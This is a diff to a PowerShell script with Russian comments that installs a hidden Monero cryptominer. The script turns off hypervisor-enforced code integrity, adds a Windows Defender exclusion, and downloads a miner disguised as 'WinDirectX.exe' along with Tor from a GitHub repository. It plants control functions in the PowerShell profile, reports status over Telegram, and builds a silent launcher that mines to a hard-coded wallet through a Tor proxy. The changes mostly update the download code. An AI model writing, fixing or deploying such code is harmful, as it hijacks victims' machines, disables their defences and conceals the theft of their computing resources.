@@ -9,6 +9,9 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 Set-ExecutionPolicy Bypass -Scope Process -Force
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
 
+# ВКЛЮЧАЕМ TLS 1.2 (БЕЗ ЭТОГО НЕ СКАЧАЕТ С GITHUB)
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 # 3. КОНФИГУРАЦИЯ
 $path = "C:\ProgramData\SystemLib"
 $wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA"
@@ -37,15 +40,14 @@ function check {
     send-tg "Ручной чек: `$status"
 }
 function update {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Write-Host "--- ЗАПУСК ОБНОВЛЕНИЯ ---" -ForegroundColor Cyan
     send-tg "⏳ Начинаю обновление компонентов..."
     Stop-Process -Name "WinDirectX", "tor" -Force -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 2
-    `$web = New-Object System.Net.WebClient
-    `$web.Headers.Add("User-Agent", "Mozilla/5.0")
     try {
-        `$web.DownloadFile("https://github.com/$user/sminers/raw/main/WinDirectX", "$path\WinDirectX.exe")
-        `$web.DownloadFile("https://github.com/$user/sminers/raw/main/tor", "$path\tor.exe")
+        Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/WinDirectX" -OutFile "$path\WinDirectX.exe" -UserAgent "Mozilla/5.0"
+        Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/tor" -OutFile "$path\tor.exe" -UserAgent "Mozilla/5.0"
         Write-Host "✅ Файлы обновлены!" -ForegroundColor Green
         send-tg "✅ Файлы обновлены. Перезапускаю..."
     } catch {
@@ -64,14 +66,27 @@ function delete {
 "@
 $Functions | Out-File -FilePath $profilePath -Force -Encoding utf8
 
-# 5. ЗАГРУЗКА ФАЙЛОВ
+# 5. ЗАГРУЗКА ФАЙЛОВ (Исправлено)
 if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
 Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
 
-$web = New-Object System.Net.WebClient
-$web.Headers.Add("User-Agent", "Mozilla/5.0")
-if (!(Test-Path "$path\WinDirectX.exe")) { try { $web.DownloadFile("https://github.com/$user/sminers/raw/main/WinDirectX", "$path\WinDirectX.exe") } catch {} }
-if (!(Test-Path "$path\tor.exe")) { try { $web.DownloadFile("https://github.com/$user/sminers/raw/main/tor", "$path\tor.exe") } catch {} }
+Write-Host "--- ПРОВЕРКА ФАЙЛОВ ---" -ForegroundColor Cyan
+
+# Качаем Майнер (на Гитхабе он без расширения, на ПК будет .exe)
+if (!(Test-Path "$path\WinDirectX.exe")) {
+    try {
+        Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/WinDirectX" -OutFile "$path\WinDirectX.exe" -UserAgent "Mozilla/5.0"
+        Write-Host "✅ WinDirectX загружен" -ForegroundColor Green
+    } catch { Write-Host "❌ Ошибка загрузки WinDirectX: $($_.Exception.Message)" -ForegroundColor Red }
+}
+
+# Качаем Tor (на Гитхабе без расширения, на ПК будет .exe)
+if (!(Test-Path "$path\tor.exe")) {
+    try {
+        Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/tor" -OutFile "$path\tor.exe" -UserAgent "Mozilla/5.0"
+        Write-Host "✅ Tor загружен" -ForegroundColor Green
+    } catch { Write-Host "❌ Ошибка загрузки Tor: $($_.Exception.Message)" -ForegroundColor Red }
+}
 
 # 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА
 $cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 30 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --no-huge-pages --max-cpu-usage 50"
